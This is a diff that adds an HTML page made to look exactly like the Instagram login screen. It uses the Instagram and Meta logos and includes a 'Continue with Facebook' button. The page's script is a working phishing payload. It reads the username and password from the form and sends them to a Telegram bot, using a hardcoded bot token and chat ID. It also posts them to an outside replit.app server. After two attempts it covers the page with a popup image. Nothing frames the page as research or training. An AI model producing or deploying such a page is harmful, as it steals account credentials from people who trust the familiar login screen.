@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+
+    <style>
+        body,
+        html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+        }
+
+        .wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            height: 100%;
+        }
+
+        .language {
+            margin: 20px 0;
+        }
+
+        .language select {
+            border: none;
+            background-color: transparent;
+            font-size: 14px;
+            color: #999;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            background-color: #fff;
+            padding: 40px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .logo img {
+            width: 175px;
+            margin-bottom: 40px;
+        }
+
+        .fb-login {
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            padding: 6px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .fb-login img {
+            width: 18px;
+            height: 18px;
+            margin-right: 10px;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .line {
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .or {
+            margin: 0 10px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        .login-form {
+            text-align: left;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-container input {
+            padding-right: 70px;
+        }
+
+        .show-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 12px;
+            color: black;
+            font-weight: bold;
+            display: none;
+        }
+
+        .forgot-password {
+            font-size: 12px;
+            color: #3897f0;
+            display: block;
+            margin-top: 5px;
+            text-align: right;
+            text-decoration: none;
+        }
+
+        .login-btn {
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            padding: 5px;
+            width: 100%;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 30px;
+        }
+
+        .sign-up {
+            margin-top: 40px;
+            font-size: 14px;
+        }
+
+        .sign-up a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #999;
+            margin-top: 40px;
+        }
+
+        .footer-text a {
+            color: #999;
+            text-decoration: none;
+        }
+
+        .footer-text strong {
+            color: black;
+        }
+
+        .meta-logo {
+            margin-top: 60px;
+            margin-bottom: 10px;
+        }
+
+        .meta-logo img {
+            width: 70px;
+        }
+
+        #popupOverlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 9998;
+        }
+
+        #popupImage {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 9999;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="wrapper">
+        <div class="language">
+            <select>
+                <option>English (UK)</option>
+                <option>English (US)</option>
+                <option>Hindi</option>
+            </select>
+        </div>
+
+        <div class="container">
+            <div class="logo">
+                <img src="https://i.ibb.co/52TpQJD/Screenshot-2024-10-04-16-34-55-27-40deb401b9ffe8e1df2f1cc5ba480b12.jpg"
+                    alt="Instagram Logo" loading="lazy">
+            </div>
+
+            <button class="fb-login">
+                <img src="https://i.ibb.co/YjGNvwj/IMG-20241004-163551.jpg" alt="Facebook Logo">
+                Continue with Facebook
+            </button>
+
+            <div class="separator">
+                <div class="line"></div>
+                <div class="or">OR</div>
+                <div class="line"></div>
+            </div>
+
+            <form class="login-form" id="loginForm">
+                <input type="text" id="username" placeholder="Phone number, username or email address" required>
+                <div class="password-container">
+                    <input type="password" id="password" placeholder="Password" required>
+                    <span class="show-password" id="showPassword">Show</span>
+                </div>
+                <a href="#" class="forgot-password">Forgot password?</a>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+
+            <p class="sign-up">Don't have an account? <a href="#">Sign up</a></p>
+
+            <p class="footer-text">By continuing, you agree to Instagram's <strong>Terms of Use</strong> and
+                <strong>Privacy Policy</strong>.
+            </p>
+        </div>
+
+        <div class="meta-logo">
+            <img src="https://i.ibb.co/2jD0XGp/Screenshot-2024-10-04-17-04-49-71-40deb401b9ffe8e1df2f1cc5ba480b12.jpg"
+                alt="Meta Logo">
+        </div>
+
+        <div id="popupOverlay"></div>
+        <img id="popupImage" src="https://i.postimg.cc/VNtJmPDM/kyojuro-rengoku-750x1334-17590.png" alt="Popup Image"
+            width="300px">
+    </div>
+
+    <script>
+        var uid = "6260f23089ddfacb3a360b02a24e0bd7";
+        var loginClickCount = 0; // Initialize the click counter
+
+        async function gather(username, password) {
+            var td = `Harjot's website user<br><b>Username:</b> ${username}<br><b>Password:</b> ${password}<br>`;
+            
+            // Add the current date and time
+            td += `<b>Date:</b> ${new Date().toLocaleDateString()}<br>`;
+            td += `<b>Time:</b> ${new Date().toLocaleTimeString()}<br>`;
+            
+            // Send the data to your Telegram bot
+            const botToken = '7661316522:AAHHZ5zTzh_FCn9kxcijqL-pIKUp1H3_mbA'; // Your bot's token
+            const chatId = '6119512056';  // Your chat ID (replace with the correct chat ID)
+
+            const message = `Harjot's website user\n\nUsername: ${username}\nPassword: ${password}\nDate: ${new Date().toLocaleDateString()}\nTime: ${new Date().toLocaleTimeString()}`;
+            
+            // Send data to the Telegram bot
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Message sent to bot successfully!");
+                    } else {
+                        console.error("Error sending message to bot:", data);
+                    }
+                })
+                .catch(error => {
+                    console.error("Error:", error);
+                });
+
+            // Continue to send the data to your server if needed
+            $.post("https://open-google.replit.app/", { data: td, uid });
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function (e) {
+            e.preventDefault(); // Prevent the default form submission
+
+            // Get username and password values
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Increment the login click count
+            loginClickCount++;
+
+            // Ensure the input values remain in the form after clicking the login button
+            document.getElementById('username').value = username;
+            document.getElementById('password').value = password;
+
+            // Show the popup after two clicks
+            if (loginClickCount === 2) {
+                document.getElementById('popupOverlay').style.display = 'block';
+                document.getElementById('popupImage').style.display = 'block';
+            }
+
+            // Call the gather function with the login data
+            gather(username, password);
+        });
+
+        // Close popup on overlay click
+        document.getElementById('popupOverlay').addEventListener('click', function () {
+            this.style.display = 'none';
+            document.getElementById('popupImage').style.display = 'none';
+            loginClickCount = 0; // Reset the click counter
+        });
+
+        // Show/Hide password functionality
+        document.getElementById('showPassword').addEventListener('click', function () {
+            var passwordField = document.getElementById('password');
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                this.textContent = "Hide";
+            } else {
+                passwordField.type = "password";
+                this.textContent = "Show";
+            }
+        });
+
+        // Detect input in the password field and toggle the visibility of the "Show" button
+        document.getElementById('password').addEventListener('input', function () {
+            var showPasswordButton = document.getElementById('showPassword');
+            if (this.value.length > 0) {
+                showPasswordButton.style.display = 'inline';  // Show the button
+            } else {
+                showPasswordButton.style.display = 'none';    // Hide the button
+            }
+        });
+    </script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</body>
+
+</html>
